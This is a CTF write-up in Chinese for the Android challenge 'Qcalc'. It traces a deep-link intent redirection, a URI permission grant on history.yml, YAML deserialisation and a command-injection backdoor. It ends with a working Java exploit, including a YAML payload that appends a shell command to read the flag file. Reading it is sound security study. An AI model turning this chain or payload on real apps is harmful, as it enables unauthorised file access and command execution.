---
title: "强网杯s9初赛 Qcalc wp"
date: 2025-11-10 11:29:30
updated: 2025-11-10 11:29:30
categories:
  - "CTF"
tags:
  - "CTF"
  - "强网杯"
  - "Android"
  - "逆向工程"
  - "Deep Link"
  - "漏洞分析"
excerpt: "Qcalc 题解，分析 Deep Link 输入处理、表达式计算及相关漏洞。"
source_date_basis: file-mtime
---
## 逆向过程

MainActivity可通过qiangcalc://calculate形式的uri启动

![image-20251110102908507](/media/posts/qwb-s9-qcalc/1f79e290fd195e6d.png)

MainActivity收到intent时会调用handleIntent方法

![image-20251110102631486](/media/posts/qwb-s9-qcalc/c1c02f3d3523d699.png)

handleIntent会判断Action并取出其中的expression参数并传入processDeeplinkExpression中

![image-20251110102702092](/media/posts/qwb-s9-qcalc/abe93c77087c9f8d.png)

processDeeplinkExpression会判断传入的expression是否为intent scheme，是的话将该uri转成intent并存入顶层intent的fallback参数中，并计算哈希一并存入。

如果是普通的表达式的话，该方法会取出表达式的两个操作数并调用onEqual()进行计算

![image-20251110103051735](/media/posts/qwb-s9-qcalc/f928d2e6a57cb95f.png)

onEqual中值得注意的是除法，如果除以0会抛出除0异常，并交由异常处理来处理。catch中取出了fallback并存入了一些新的参数（作用不大），最后将fallback作为bridgeIntent的参数origIntent传入，并启动BridgeActivity

![image-20251110103328909](/media/posts/qwb-s9-qcalc/96146b0c8e459760.png)

BridgeActivity首先会对传入的intent进行校验，大部分的参数都是onEqual中硬编码的所以不会错，唯一需要注意的是**this**.validateToken方法，对bridge_token参数进行了校验，将其与包名的sha256进行了比较，这个参数在之前都没有出现过，所以是一开始就要在fallback对应的intent scheme里就要传入

![image-20251110103911786](/media/posts/qwb-s9-qcalc/9759423d5b2e79e7.png)

![image-20251110103926219](/media/posts/qwb-s9-qcalc/b8e421466de9fbf9.png)

验证通过后，为origIntent赋予通过provider读写（addFlags(3)）/data/data/com.qinquang.calc/files/history.yml的权限并启动Activity

![image-20251110104148336](/media/posts/qwb-s9-qcalc/30004f5ce235959e.png)

## 漏洞分析

上面的分析中，我们最后发现有一个content provider，该provider不导出，但设置了grantUriPermissions=“true”，这样我们可以传入intent来调用该provider。但是目标apk中唯一授权的只有/data/data/com.qinquang.calc/files/history.yml，意味着我们不能直接通过provider读取flag只能读写history.yml

![image-20251110104746578](/media/posts/qwb-s9-qcalc/68f00fe6be9ccf0a.png)

HistoryManager.loadHistory中通过yaml.load反序列化了history.yml文件，并判断其是否为intent，是的话就启动该intent。但是我们在上面已经可以构造一个intent了，再构造一个意义不大

![image-20251110105135923](/media/posts/qwb-s9-qcalc/3eef883e6a748065.png)

注意到有一个没调用过的类PingUtil，很明显的后门函数，命令拼接，那我们可以直接利用上面的反序列化执行该类的init方法从而实现命令执行

![image-20251110110634120](/media/posts/qwb-s9-qcalc/90c6f8bfc7c99504.png)

本来考虑直接通过网络传出flag或者先写入外部存储然后再读取，但很不幸apk没有这两个权限。考虑到我们可以对history.yml进行读取，我们可以将flag写入yml文件中再进行读取。

剩下的问题就是如何触发反序列化了，loadHistory在onCreate和saveHistory中有调用，saveHistory在onEqual的末尾有调用，我们可以通过传入intent进行一次正常的运算来调用saveHistory

但在saveHistory中，调用完loadHistory后他会对yml进行覆写，会把我们的flag给清掉，所以我们需要卡一个timing，在写入flag后和flag被覆写前趁机读取出flag，这就要自己延时慢慢调了

![image-20251110111924542](/media/posts/qwb-s9-qcalc/4072e5896d4f21c0.png)

## 漏洞利用

综上，利用链可总结为：

- 传入intent scheme到fallback中 
- 触发除0异常调用BridgeActivity获取history.yml读写权限，并启动fallback intent（由于这个是我们自己传入的，所以我们可以再次启动我们自己的Activity） 
- 回调到我们的Activity，对history.yml文件写入poc
- 正常进行一次计算，触发反序列化漏洞
- 等待flag写入yml文件后，读取出flag

由于是复现，就不将flag发送到外网了，这里就直接将flag写到log里，exp如下

```java
package com.example.qcalc;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "qcalcccccccc";
    private String getToken(){
        try {
            byte[] arr_b = MessageDigest.getInstance("SHA-256").digest("com.qinquang.calc".getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for(int i = 0; i < 8; ++i) {
                sb.append(String.format("%02x", ((byte)arr_b[i])));
            }
            return sb.toString();
        }
        catch(Exception e) {
            return "Error";
        }
    }
    private String getExp()
    {
        String yaml = "!!com.qinquang.calc.PingUtil 127.0.0.1; /system/bin/cat /data/data/com.qinquang.calc/files/flag.txt > /data/data/com.qinquang.calc/files/history.yml";
        return yaml;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG,"123123123");
        Intent intent = this.getIntent();
        Uri yamlUri = null;
        if (intent != null)
            yamlUri = intent.getData();
        
        // 因为该exp会让目标apk再次调用该Activity，所以该Activity实际上执行了两次，第一次是直接执行，第二次通过intent执行并返回了history.yml的uri，所以要进行一次判断
        if (yamlUri == null)
        {
            // 传入fallback
            Intent fallBackIntent = new Intent(Intent.ACTION_VIEW);
            fallBackIntent.setClassName(getPackageName(),MainActivity.class.getName());
            fallBackIntent.putExtra("bridge_token", getToken());
            String uri = fallBackIntent.toUri(Intent.URI_INTENT_SCHEME);
            uri = Uri.encode(uri);
            Intent intent1 = new Intent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=" + uri));
            intent1.setPackage("com.qinquang.calc");
            startActivity(intent1);
            
            // 触发div 0
            Log.d(TAG,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
            Intent intent2 = new Intent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=0%2F0"));
            intent2.setPackage("com.qinquang.calc");
            intent2.putExtra("fallback",fallBackIntent);
            startActivity(intent2);
            finish();
            return ;
        }
        
        // 获得history.yml读写权限，写入exp
        try {
            OutputStream os = getContentResolver().openOutputStream(yamlUri);
            os.write(getExp().getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        
        // 进行一次正常运算，触发反序列化漏洞
        Intent intent3 = new Intent(Intent.ACTION_VIEW, Uri.parse("qiangcalc://calculate?expression=2%2B2"));
        intent3.setPackage("com.qinquang.calc");
        startActivity(intent3);
        
        // 卡timing读取flag，需要慢慢调
        final Uri yaml = yamlUri;
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    StringBuilder sb = new StringBuilder();
                    InputStream is = getContentResolver().openInputStream(yaml);
                    InputStreamReader ir = new InputStreamReader(is, StandardCharsets.UTF_8);
                    BufferedReader br = new BufferedReader(ir);
                    String line;
                    while ((line = br.readLine()) != null)
                        sb.append(line);
                    Log.d(TAG, "flag: "+ sb.toString());
                } catch (Exception e) {

                }
            }
        },50); // 延时1秒

    }
}
```

在日志里获得flag

![image-20251110112916867](/media/posts/qwb-s9-qcalc/57bb126517118a0f.png)
